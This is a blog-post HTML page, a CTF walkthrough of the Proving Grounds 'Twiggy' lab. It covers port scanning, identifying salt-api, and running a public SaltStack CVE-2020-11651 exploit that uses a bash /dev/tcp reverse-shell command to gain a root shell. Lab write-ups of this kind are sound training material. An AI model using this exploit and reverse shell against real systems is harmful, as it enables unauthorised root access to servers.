@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- Beautiful Jekyll 5.0.0 | Copyright Dean Attali 2020 -->
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  
+
+  
+
+  <title>Proving Grounds - Twiggy</title>
+
+  
+  <meta name="author" content="Marius Žukovskis">
+  
+
+  <meta name="description" content="CTF Walkthrough">
+
+  
+
+  
+
+  
+  <link rel="alternate" type="application/rss+xml" title="Home" href="http://localhost:4000/feed.xml">
+  
+
+  
+
+  
+
+  
+<!-- Google Analytics -->
+<script>
+  (function (i, s, o, g, r, a, m) {
+    i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+      (i[r].q = i[r].q || []).push(arguments)
+    }, i[r].l = 1 * new Date(); a = s.createElement(o),
+      m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+  })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+  ga('create', 'G-FRY4BRR0KD', 'auto');
+  ga('send', 'pageview');
+</script>
+<!-- End Google Analytics -->
+
+
+  
+
+
+  
+    
+      
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+
+    
+      
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800">
+
+
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="/assets/css/bootstrap-social.css">
+    
+      <link rel="stylesheet" href="/assets/css/beautifuljekyll.css">
+    
+  
+
+  
+
+  
+  
+  
+
+  
+
+  
+  <meta property="og:site_name" content="Home">
+  <meta property="og:title" content="Proving Grounds - Twiggy">
+  <meta property="og:description" content="CTF Walkthrough">
+
+  
+  <meta property="og:image" content="http://localhost:4000/assets/img/twiggy/twiggy.jpg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:article:author" content="Marius Žukovskis">
+  <meta property="og:article:published_time" content="2022-11-16T00:00:00+02:00">
+  <meta property="og:url" content="http://localhost:4000/2022-11-16-PG-Twiggy/">
+  <link rel="canonical" href="http://localhost:4000/2022-11-16-PG-Twiggy/">
+  
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  
+  <meta name="twitter:site" content="@">
+  <meta name="twitter:creator" content="@">
+
+  <meta property="twitter:title" content="Proving Grounds - Twiggy">
+  <meta property="twitter:description" content="CTF Walkthrough">
+
+  
+  <meta name="twitter:image" content="http://localhost:4000/assets/img/twiggy/twiggy.jpg">
+  
+
+  
+
+
+  
+
+  
+
+</head>
+
+
+<body>
+
+  
+
+
+  <nav class="navbar navbar-expand-xl navbar-light fixed-top navbar-custom top-nav-regular"><a class="navbar-brand" href="http://localhost:4000/">Home</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+
+  <div class="collapse navbar-collapse" id="main-navbar">
+    <ul class="navbar-nav ml-auto">
+          <li class="nav-item">
+            <a class="nav-link" href="/posts">Posts</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="/whoami">About Me</a>
+          </li></ul>
+  </div>
+
+  
+
+  
+
+</nav>
+
+
+
+
+
+  <!-- TODO this file has become a mess, refactor it -->
+
+
+
+
+
+
+  <div id="header-big-imgs" data-num-img=1
+    
+    
+    
+      
+      data-img-src-1="http://localhost:4000/assets/img/twiggy/twiggy.jpg"
+    
+    
+    
+  ></div>
+
+
+<header class="header-section has-img">
+
+<div class="big-img intro-header">
+  <div class="container-md">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+        <div class="post-heading">
+          <h1>Proving Grounds - Twiggy</h1>
+          
+            
+              <h2 class="post-subheading">CTF Walkthrough</h2>
+            
+          
+
+          
+            <span class="post-meta">Posted on November 16, 2022</span>
+            
+            
+          
+        </div>
+      </div>
+    </div>
+  </div>
+  <span class='img-desc'></span>
+</div>
+
+<div class="intro-header no-img">
+  <div class="container-md">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+        <div class="post-heading">
+          <h1>Proving Grounds - Twiggy</h1>
+          
+            
+              <h2 class="post-subheading">CTF Walkthrough</h2>
+            
+          
+
+          
+            <span class="post-meta">Posted on November 16, 2022</span>
+            
+            
+          
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</header>
+
+
+
+
+
+<div class=" container-md ">
+  <div class="row">
+    <div class=" col-xl-8 offset-xl-2 col-lg-10 offset-lg-1 ">
+
+      
+
+      
+
+      <article role="main" class="blog-post">
+        <p>Easy box found in Proving Grounds practice.</p>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>Checked openports with rustscan before doing an nmap scan to save few precious minutes.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ nmap -sV -sC 192.168.209.62 -p 22,53,80,4506,4505,8000
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-16 14:21 EST
+Nmap scan report for 192.168.209.62
+Host is up (0.088s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+53/tcp   open  domain  NLnet Labs NSD
+80/tcp   open  http    nginx 1.16.1
+|_http-title: Home | Mezzanine
+|_http-server-header: nginx/1.16.1
+4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
+4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
+8000/tcp open  http    nginx 1.16.1
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: nginx/1.16.1
+|_http-title: Site doesn't have a title (application/json).
+</code></pre></div></div>
+
+<h3 id="port-80">Port 80</h3>
+
+<p>Did some enumeration on the site, directory brute-forcing, attempted SQLi on on the open fields and default admin credentials to admin page without any luck. Moving on for now.</p>
+
+<p><img src="/assets/img/twiggy/1.png" alt="alt text" /></p>
+
+<h3 id="port-8000">Port 8000</h3>
+
+<p>Looks like some sort of API.</p>
+
+<p><img src="/assets/img/twiggy/2.png" alt="alt text" /></p>
+
+<p>Reviwing headers reveals this is salt-api.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ curl -X HEAD -i 192.168.209.62:8000
+Warning: Setting custom HTTP method to HEAD with -X/--request may not work the 
+Warning: way you want. Consider using -I/--head instead.
+HTTP/1.1 200 OK
+Server: nginx/1.16.1
+Date: Wed, 16 Nov 2022 19:46:27 GMT
+Content-Type: application/json
+Content-Length: 146
+Connection: keep-alive
+Access-Control-Expose-Headers: GET, POST
+Vary: Accept-Encoding
+Allow: GET, HEAD, POST
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Origin: *
+X-Upstream: salt-api/3000-1
+</code></pre></div></div>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<p>Googling <em>salt-api exploit</em>, I got a lot of results for Saltstack. So I checked searchsploit for any known exploits.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ searchsploit saltstack
+--------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                 |  Path
+--------------------------------------------------------------------------------------------------------------- ---------------------------------
+Saltstack 3000.1 - Remote Code Execution                                                                       | multiple/remote/48421.txt
+--------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre></div></div>
+
+<p>Got a copy of this exploit which was a python script. So I used that to exploit the target. I had to install “salt” package with PIP  to use it though.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ searchsploit -m 48421
+└─$ mv 48421.txt poc.py
+</code></pre></div></div>
+
+<p>Looks like this worked.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ python poc.py --master 192.168.209.62    
+[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
+[+] Checking salt-master (192.168.209.62:4506) status... ONLINE
+[+] Checking if vulnerable to CVE-2020-11651... YES
+[*] root key obtained: vMgqnGMHH96nB/hq+jAZQI4qE/tLPYl76AiA0YG/rQvnm0NQqiGm9TKPpdBR9/BkQBg2T1CmQHk=
+</code></pre></div></div>
+
+<p>After reviewing this code I saw it takes –exec flag to execute a command, so I inserted a reverse shell.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ python poc.py --exec 'bash -i &gt;&amp; /dev/tcp/192.168.49.209/80 0&gt;&amp;1' --master 192.168.209.62
+[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
+[+] Checking salt-master (192.168.209.62:4506) status... ONLINE
+[+] Checking if vulnerable to CVE-2020-11651... YES
+[*] root key obtained: vMgqnGMHH96nB/hq+jAZQI4qE/tLPYl76AiA0YG/rQvnm0NQqiGm9TKPpdBR9/BkQBg2T1CmQHk=
+[+] Attemping to execute bash -i &gt;&amp; /dev/tcp/192.168.49.209/80 0&gt;&amp;1 on 192.168.209.62
+[+] Successfully scheduled job: 20221116194428136157
+</code></pre></div></div>
+
+<p>Looks like I got root shell.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ nc -nvlp 80
+listening on [any] 80 ...
+connect to [192.168.49.209] from (UNKNOWN) [192.168.209.62] 38154
+bash: no job control in this shell
+[root@twiggy root]# whoami
+whoami
+root
+</code></pre></div></div>
+
+<p>And thats all. GG</p>
+
+      </article>
+
+      
+        <div class="blog-tags">
+          <span>Tags:</span>
+          
+            <a href="/tags#ctf">ctf</a>
+          
+            <a href="/tags#proving grounds">proving grounds</a>
+          
+            <a href="/tags#pg">pg</a>
+          
+        </div>
+      
+
+      
+
+      
+        <!-- Check if any share-links are active -->
+
+
+
+
+<section id = "social-share-section">
+  <span class="sr-only">Share: </span>
+
+  
+    <a href="https://twitter.com/intent/tweet?text=Proving+Grounds+-+Twiggy&url=http%3A%2F%2Flocalhost%3A4000%2F2022-11-16-PG-Twiggy%2F"
+      class="btn btn-social-icon btn-twitter" title="Share on Twitter">
+      <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
+      <span class="sr-only">Twitter</span>
+    </a>
+  
+
+  
+    <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2F2022-11-16-PG-Twiggy%2F"
+      class="btn btn-social-icon btn-facebook" title="Share on Facebook">
+      <span class="fab fa-fw fa-facebook" aria-hidden="true"></span>
+      <span class="sr-only">Facebook</span>
+    </a>
+  
+
+  
+    <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2F2022-11-16-PG-Twiggy%2F"
+      class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
+      <span class="fab fa-fw fa-linkedin" aria-hidden="true"></span>
+      <span class="sr-only">LinkedIn</span>
+    </a>
+  
+
+  
+
+  
+
+</section>
+
+
+
+      
+
+      <ul class="pagination blog-pager">
+        
+        <li class="page-item previous">
+          <a class="page-link" href="/2022-11-14-PG-Pelican/" data-toggle="tooltip" data-placement="top" title="Proving Grounds - Pelican">&larr; Previous Post</a>
+        </li>
+        
+        
+      </ul>
+      
+  
+  
+  
+
+  
+
+
+  
+
+  
+
+
+
+    </div>
+  </div>
+</div>
+
+
+  <footer>
+  <div class="container-md beautiful-jekyll-footer">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+      <ul class="list-inline text-center footer-links"><li class="list-inline-item">
+    <a href="mailto:marius@zukovskis.lt" title="Email me">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Email me</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://github.com/zukoma" title="GitHub">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">GitHub</span>
+   </a>
+  </li></ul>
+
+      
+      <p class="copyright text-muted">
+      
+        Marius Žukovskis
+        &nbsp;&bull;&nbsp;
+      
+      2022
+
+      
+
+      
+
+      
+
+      </p>
+      <p class="theme-by text-muted">
+        Powered by
+        <a href="https://beautifuljekyll.com">Beautiful Jekyll</a>
+      </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  
+  
+    
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs=" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+
+  
+
+
+
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script src="/assets/js/beautifuljekyll.js"></script>
+    
+  
+
+
+
+
+
+
+
+
+
+</body>
+</html>
